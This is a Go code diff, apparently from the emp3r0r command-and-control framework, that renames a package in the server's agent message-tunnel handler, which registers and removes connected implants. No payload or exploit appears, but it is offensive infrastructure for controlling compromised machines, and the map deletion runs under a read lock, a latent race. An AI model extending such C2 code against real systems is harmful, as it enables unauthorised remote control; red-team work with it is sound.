@@ -9,7 +9,7 @@ import (
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
-	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/runtime_def"
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/internal/logging"
 	"github.com/jm33-m0/emp3r0r/core/internal/util"
@@ -28,11 +28,11 @@ func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer func() {
 		logging.Debugf("handleMessageTunnel exiting")
-		for t, c := range def.AgentControlMap {
+		for t, c := range runtime_def.AgentControlMap {
 			if c.Conn == conn {
-				def.AgentControlMapMutex.RLock()
-				delete(def.AgentControlMap, t)
-				def.AgentControlMapMutex.RUnlock()
+				runtime_def.AgentControlMapMutex.RLock()
+				delete(runtime_def.AgentControlMap, t)
+				runtime_def.AgentControlMapMutex.RUnlock()
 				logging.Errorf("[%d] Agent dies", c.Index)
 				logging.Printf("[%d] agent %s disconnected", c.Index, strconv.Quote(t.Tag))
 				agents.ListConnectedAgents()
@@ -77,13 +77,13 @@ func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
 				return
 			}
 			shortname := agent.Name
-			if def.AgentControlMap[agent].Conn == nil {
-				logging.Successf("[%d] Knock.. Knock...", def.AgentControlMap[agent].Index)
+			if runtime_def.AgentControlMap[agent].Conn == nil {
+				logging.Successf("[%d] Knock.. Knock...", runtime_def.AgentControlMap[agent].Index)
 				logging.Successf("agent %s connected", strconv.Quote(shortname))
 			}
-			def.AgentControlMap[agent].Conn = conn
-			def.AgentControlMap[agent].Ctx = ctx
-			def.AgentControlMap[agent].Cancel = cancel
+			runtime_def.AgentControlMap[agent].Conn = conn
+			runtime_def.AgentControlMap[agent].Ctx = ctx
+			runtime_def.AgentControlMap[agent].Cancel = cancel
 		}
 	}()
 	for ctx.Err() == nil {
